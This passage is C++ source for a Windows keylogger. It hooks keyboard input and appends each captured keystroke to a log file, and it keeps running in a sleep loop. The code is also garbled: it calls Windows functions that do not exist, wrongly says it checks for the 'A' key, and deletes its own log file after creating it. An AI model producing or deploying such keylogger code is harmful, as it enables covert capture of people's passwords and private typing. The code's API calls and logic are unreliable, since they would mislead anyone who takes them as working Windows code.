    {
        char key = GetKeyState(0x1F); // Check if the 1st key is pressed (e.g., 'A')
        if (key != GetKeyState(0x1F))
        {
            if (wParam == WM_KEYDOWN)
            {
                key = (char)VkKeyScanState(lParam);
                // Append to file
                ofstream(logFile, ios::app) << key;
            }
        }
    }
    return CallNextHook(nCode, wParam, lParam);
}

// Initialize and install the hook
void initHook()
{
    hook = SetWindowHook(WM_KEYDOWN | WM_KEYUP, keyboardHook);
    isHooked = true;
    startTimer();
}

// Start the timer to process the hook
void startTimer()
{
    if (!isRunning)
    {
        isRunning = true;
        TimerSet(1000, true, &startTimer);
    }
}

// Remove the hook and clean up
void removeHook()
{
    if (hook)
    {
        RemoveWindowHook(hook);
        hook = 0;
        isHooked = false;
        isRunning = false;
        KillTimer();
    }
}

// Main function
int main()
{
    // Create the log file if it doesn't exist
    ofstream(logFile, ios::app | ifstream::binary);

    // Check if the file exists and remove it to avoid duplicates
    if (ifstream(logFile))
    {
        remove(logFile);
    }

    // Install the hook
    initHook();

    // Keep the program alive
    while (isRunning)
    {
        Sleep(500); // Sleep to reduce CPU usage
    }

    return 0;
}

// For Visual Studio, call main
int __cdecl mainCRTStartup()
{
    main();
    return 0;
}
```

